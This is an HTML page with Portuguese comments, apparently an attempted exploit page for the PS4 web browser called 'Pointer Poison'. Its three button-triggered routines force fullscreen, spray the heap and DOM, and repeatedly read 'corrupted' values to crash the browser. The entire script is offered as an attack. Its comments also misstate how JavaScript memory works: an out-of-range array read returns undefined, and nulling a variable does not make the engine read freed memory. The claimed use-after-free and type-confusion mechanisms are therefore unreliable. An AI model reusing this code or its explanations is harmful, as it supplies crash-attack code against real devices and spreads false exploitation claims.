
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 Suite v370000: Pointer Poison</title>
<style>
    body { background: #000; color: #f00; font-family: monospace; text-align: center; padding: 10px; }
    h1 { border-bottom: 2px solid #f00; color: #fff; }
    .status { 
        border: 2px solid #fff; padding: 15px; margin-bottom: 20px; 
        font-size: 1.2em; background: #300; color: #fff; font-weight: bold;
    }
    
    button {
        display: block; width: 100%; padding: 25px; margin: 15px 0;
        background: #111; color: #f00; border: 2px solid #f00;
        font-size: 20px; font-weight: bold; cursor: pointer; text-transform: uppercase;
    }
    button:hover { background: #f00; color: #000; }
    
    #stage { background: #111; height: 50px; border: 1px solid #555; margin-top: 20px; }
</style>
</head>
<body>

<h1>v370000: POINTER POISON</h1>

<div class="status">
    OBJETIVO: TRANSFORMAR "SOFTLOCK" EM "SEGFAULT"<br>
    CLIQUE -> FULLSCREEN -> FECHE ALERTA
</div>

<button onclick="poison(p01)">01. Array Length Confusion</button>

<button onclick="poison(p02)">02. Fake Object Address Jump</button>

<button onclick="poison(p03)">03. Float64 / Pointer Overlap</button>

<div id="stage">ALVO</div>

<script>
    const Stage = document.getElementById('stage');
    
    // VARIÁVEIS GLOBAIS PARA MANTER MEMÓRIA VIVA
    let arrays = [];
    let floats = [];

    // =================================================================
    // EXECUTOR
    // =================================================================
    function poison(vectorFunc) {
        Stage.innerHTML = "";
        arrays = [];
        floats = [];
        
        // 1. Configura o Alvo
        const target = vectorFunc(Stage);
        
        // 2. Fullscreen
        if (target.webkitRequestFullscreen) target.webkitRequestFullscreen();
        else if (target.requestFullscreen) target.requestFullscreen();

        // 3. Timing
        requestAnimationFrame(() => {
            setTimeout(() => {
                // ALERTA
                window.alert("⚠️ POINTER POISON ⚠️\n\nAo fechar, tentaremos ler um endereço de memória inválido.");

                // A. DETONAÇÃO (Visual - Tela Branca/Preta)
                if(target._detonate) target._detonate();

                // B. LOOP DE ACESSO (O Gatilho do Crash)
                // Tenta acessar a propriedade corrompida repetidamente
                if(target._access) {
                    function loop() {
                        try { target._access(); } catch(e) {}
                        requestAnimationFrame(loop); // Mantém o loop vivo sem travar o alerta
                    }
                    loop();
                }
                
            }, 50);
        });
    }

    // =================================================================
    // 01. Array Length Confusion
    // Tenta confundir o tamanho de um array durante a destruição do DOM.
    // Se o tamanho ficar gigante, acessamos memória fora do permitido.
    // =================================================================
    function p01(stage) {
        const d = document.createElement('div');
        d.innerText = "ARRAY POISON";
        stage.appendChild(d);

        // Cria array alvo
        const targetArray = new Array(100);
        targetArray.fill(1);

        d._detonate = () => {
            // Nuke visual (Tela Branca)
            document.body.innerHTML = "";
            
            // Tenta liberar a memória onde o array vive
            // Criando pressão no Heap
            for(let i=0; i<5000; i++) arrays.push(new Array(100));
        };

        d._access = () => {
            // Tenta ler o índice 1.000.000 de um array de tamanho 100
            // Em condições normais retorna 'undefined'.
            // Se houver corrupção de memória, o navegador tenta ler e CRASHA.
            const val = targetArray[0xFFFFF]; 
            // Acesso aritmético para forçar leitura de memória
            const x = val + 1;
        };
        return d;
    }

    // =================================================================
    // 02. Fake Object Address Jump
    // O mais perigoso. Tenta fazer o navegador tratar um número (0x4141...)
    // como se fosse o ponteiro de um objeto.
    // =================================================================
    function p02(stage) {
        const d = document.createElement('div');
        d.innerText = "FAKE OBJ POISON";
        stage.appendChild(d);

        // Objeto que será deletado
        let victim = { a: 1, b: 2, c: 3 };

        // Payload de números que fingem ser um objeto (Headers falsos)
        const fakeStruct = new Float64Array(10);
        // 1.123... é uma representação float de um ponteiro específico em Hex
        fakeStruct.fill(1.123456789e-100); 

        d._detonate = () => {
            // "Libera" a vítima (remove referências)
            victim = null; 
            d.remove();
            
            // Tenta ocupar o lugar da vítima com nosso array de floats
            floats.push(fakeStruct);
        };

        d._access = () => {
            // Tentamos acessar a variável 'victim'.
            // Se o Garbage Collector for lento e nosso FloatArray ocupou o lugar,
            // 'victim.a' vai ler pedaços do nosso float como se fosse ponteiro.
            // Isso causa Segmentation Fault imediato.
            if (victim) {
                const x = victim.a;
            } else {
                // Se victim é null, tentamos acessar o fakeStruct como objeto
                // (Simulação de confusão)
                const y = fakeStruct[0];
            }
        };
        return d;
    }

    // =================================================================
    // 03. Float64 / Pointer Overlap
    // Cria arrays mistos e tenta confundir tipos durante o Fullscreen.
    // =================================================================
    function p03(stage) {
        const d = document.createElement('div');
        d.innerText = "FLOAT OVERLAP";
        stage.appendChild(d);

        // Array misto (objetos e números) é difícil para a engine otimizar
        const arr = [1.1, 2.2, {a:1}, 3.3];

        d._detonate = () => {
            // Tela Preta (DOM Spray para travar layout)
            const f = document.createDocumentFragment();
            for(let i=0; i<1000; i++) f.appendChild(document.createElement('div'));
            document.body.appendChild(f);
            document.body.innerHTML = "";
        };

        d._access = () => {
            // Trocamos o tipo do array repetidamente
            // Isso força o JIT (Just-In-Time compiler) a recompilar o código
            // enquanto a CPU está sob stress do Fullscreen
            arr[2] = 4.4; // Vira tudo float
            arr[2] = {b:2}; // Vira misto
            
            // Leitura insegura
            const v = arr[2];
        };
        return d;
    }

</script>
</body>
</html>
